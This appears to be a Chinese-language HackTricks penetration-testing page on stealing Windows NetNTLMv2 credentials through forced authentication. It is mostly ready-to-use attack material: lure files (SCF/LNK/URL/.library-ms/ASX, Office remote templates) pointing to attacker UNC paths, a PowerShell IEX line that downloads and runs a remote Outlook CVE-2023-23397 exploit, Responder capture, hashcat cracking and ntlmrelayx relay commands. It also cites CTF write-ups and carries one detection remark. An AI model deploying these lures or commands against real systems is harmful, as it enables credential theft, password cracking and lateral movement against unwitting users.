# 窃取 NTLM creds 的位置

{{#include ../../banners/hacktricks-training.md}}

**查看 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 中所有精彩的思路，从在线下载 microsoft word 文件，到 NTLM leaks 来源：https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md，以及 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### 可写 SMB share + Explorer 触发的 UNC lure（ntlm_theft/SCF/LNK/library-ms/desktop.ini）

如果你可以**向用户或 scheduled jobs 使用 Explorer 浏览的 share 写入内容**，则放入 metadata 指向你的 UNC 的文件（例如 `\\ATTACKER\share`）。渲染该文件夹会触发**隐式 SMB authentication**，并将 **NetNTLMv2** 泄露到你的 listener。<sup>[[1]](#references)</sup>

1. **生成 lure**（涵盖 SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 等）
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **将它们放入可写共享目录**（受害者打开的任意文件夹）：
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **监听并破解**：
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows 可能会同时访问多个文件；Explorer 预览的任何内容（`BROWSE TO FOLDER`）都无需点击。

### Windows Media Player 播放列表（.ASX/.WAX）

如果能让目标打开或预览由你控制的 Windows Media Player 播放列表，就可以通过将条目指向 UNC 路径来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取所引用的媒体，并自动进行身份验证。<sup>[[3]](#references)[[4]](#references)</sup>

示例 payload：
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集和破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer 在直接从 ZIP archive 中打开 .library-ms 文件时会以不安全的方式处理这些文件。如果 library definition 指向远程 UNC path（例如，\\attacker\share），只需在 ZIP 中浏览或启动该 .library-ms，Explorer 就会枚举该 UNC，并向 attacker 发送 NTLM authentication。这会获取一个 NetNTLMv2，可进行 offline cracking，或可能用于 relay。<sup>[[2]](#references)</sup>

指向 attacker UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
操作步骤
- 使用上述 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩（在 Windows 上：发送到 → 压缩(zipped)文件夹），然后将 ZIP 发送给目标。
- 运行 NTLM capture listener，并等待受害者从 ZIP 内部打开 .library-ms 文件。


### Outlook 日历提醒 sound path（CVE-2023-23397）– zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows 会处理日历项目中的扩展 MAPI 属性 PidLidReminderFileParameter。如果该属性指向 UNC 路径（例如，\\attacker\share\alert.wav），Outlook 会在提醒触发时连接 SMB share，无需任何点击即可泄露用户的 Net-NTLMv2。该问题已于 2023 年 3 月 14 日修复，但对于 legacy/未更新的环境以及历史事件响应而言仍然非常重要。<sup>[[5]](#references)</sup>

使用 PowerShell（Outlook COM）进行快速利用：
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
监听端：
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
备注
- 受害者只需在 reminder 触发时运行 Outlook for Windows。
- 该 leak 会获取适用于 offline cracking 或 relay 的 Net‑NTLMv2（不适用于 pass‑the‑hash）。


### 基于 .LNK/.URL 图标的 zero‑click NTLM leak（CVE‑2025‑50154 – 绕过 CVE‑2025‑24054）

Windows Explorer 会自动渲染快捷方式图标。近期研究表明，即使 Microsoft 针对 UNC 图标快捷方式发布了 2025 年 4 月补丁，仍然可以通过将快捷方式目标托管在 UNC 路径上，同时保持图标为本地图标，在无需点击的情况下触发 NTLM authentication（该补丁绕过被分配为 CVE‑2025‑50154）。仅查看文件夹就会使 Explorer 从远程目标获取 metadata，并将 NTLM 发送到攻击者的 SMB server。<sup>[[6]](#references)</sup>

最小化的 Internet Shortcut payload（.url）：
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
通过 PowerShell 编程 Shortcut payload（.lnk）：
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
投递思路
- 将 shortcut 放入 ZIP，并诱使受害者浏览该 ZIP。
- 将 shortcut 放置在受害者会打开的可写共享目录中。
- 在同一文件夹中放入其他诱饵文件，使 Explorer 预览这些项目。

### 通过 ExtraData 图标路径实现无点击 .LNK NTLM leak（CVE‑2026‑25185）

Windows 会在**查看/预览**期间加载 `.lnk` 元数据（进行图标渲染），而不仅仅是在执行时加载。CVE‑2026‑25185 展示了一条解析路径：**ExtraData** 块会导致 shell 在加载期间解析图标路径并访问文件系统；当该路径为远程路径时，就会发出 NTLM。

关键触发条件（在 `CShellLink::_LoadFromStream` 中观察到）：
- 在 ExtraData 中包含 **DARWIN_PROPS** (`0xa0000006`)（作为进入图标更新例程的门控条件）。
- 包含 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`)，并填充 `TargetUnicode`。
- 加载器会展开 `TargetUnicode` 中的环境变量，并对生成的路径调用 `PathFileExistsW`。

如果 `TargetUnicode` 解析为 UNC 路径（例如 `\\attacker\share\icon.ico`），**仅查看**包含该 shortcut 的文件夹就会导致出站身份验证。相同的加载路径也可能被**索引**和**AV 扫描**触发，因此这实际上构成了一个无点击 leak 面。<sup>[[7]](#references)</sup>

**LnkMeMaybe** 项目提供了 Research tooling（解析器/生成器/UI），可在不使用 Windows GUI 的情况下构建和检查这些结构。<sup>[[8]](#references)</sup>


### 通过 `davclnt.dll,DavSetCookie` 强制 WebDAV 身份验证/验证凭据

原生 **WebDAV client** 可被滥用，迫使当前登录会话向任意 **HTTP/WebDAV** endpoint 进行身份验证：
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
为什么这很有用：
- 对于**攻击者控制的 WebDAV server**，它可以在无需部署自定义 client 的情况下触发 **NTLM over HTTP**。
- 对于**内部主机**，这是一种安静地**验证被窃取的凭据在哪些位置被接受**的方法，然后再进行横向移动。<sup>[[9]](#references)</sup>
- 当 **SMB egress 被过滤**，但 **HTTP/WebDAV** 仍可访问时，该命令是一个很好的替代方案。

操作注意事项：
- 源主机上必须运行 **WebClient** 服务。
- `rundll32.exe` 会加载 `davclnt.dll`，并让 Windows 使用**当前用户的凭据**处理 WebDAV authentication。<sup>[[10]](#references)</sup>
- 如果将其指向你控制的 infrastructure，请使用支持 NTLM 的 HTTP listener/relay，例如：
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
从 detection 角度来看，针对多个内部系统重复执行 `rundll32.exe davclnt.dll,DavSetCookie`，是 **credential validation / 类 spray 的 lateral movement 准备** 的强信号，而不是正常用户行为。<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) 以 coerce NTLM

Office 文档可以引用外部模板。如果将 attached template 设置为 UNC 路径，打开文档时就会向 SMB 进行 authentication。

Minimal DOCX relationship changes（在 word/ 内）：

1) 编辑 word/settings.xml，并添加 attached template reference：
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels，并将 rId1337 指向你的 UNC：
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 重新打包为 .docx 并交付。运行 SMB capture listener，并等待打开。

有关 post-capture 中 relay 或滥用 NTLM 的思路，请查看：

{{#ref}}
README.md
{{#endref}}


## 参考资料
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
